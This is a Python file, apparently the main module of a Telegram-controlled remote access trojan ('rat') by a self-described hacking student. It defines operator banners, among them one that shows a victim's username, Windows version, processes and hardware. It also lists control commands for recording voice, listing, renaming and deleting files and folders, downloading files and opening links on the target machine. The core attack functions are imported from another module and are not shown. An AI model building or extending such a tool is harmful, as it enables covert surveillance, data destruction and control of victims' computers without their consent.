# [~] Main.py
# Codeing "UTF-8"
# CopyRight (C) 2023 By *Mr-Melfex*
# License BCD (SEE LICENSE IN MAIN FOLDER)

from    Core.Main_Core              import  *

#\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\#

StartBanner = """
Hello dear,
use the following buttons to control.
In addition, if you need help, you can use the <Help> button
"""

RatSettingBanner = """
welcome.
Here we considered the keys and commands to control the rat.
Click to use them or send them
"""

TargetInfoBanner = f"""
**Welcome!**

__UserName__ : {SystemInformation()["USERNAME"]}
__Windows__  : {SystemInformation()["WINDOWSNUMBER"]}
__Process__  : {SystemInformation()["WINDOWSPROCESS"]}

__Ram Size__ : {RamInfo()}
__Cpu Info__ : {CpuInfo()}
__Gpu Info__ : {GpuInfo()}


"""

AttackBanner = """"""

DevBanner = """
welcome
I am Farshad,
a student of hacking and security,Telegram bot & web designer
You will be able to follow me on:
"""

HelpBanner = """
"""

PowerBanner = """
welcome. Select one of the following buttons to do the work
ّّFor help use <Help> button
"""

Tolls1Banner = """
"""

Tolls2Banner = """
/MessageBox
/VoiseMessage 
/VoiceRecorder 
/Ls
/RenameFile
/RemoveFolder
/RemoveFile
/Download
/OpenLink
"""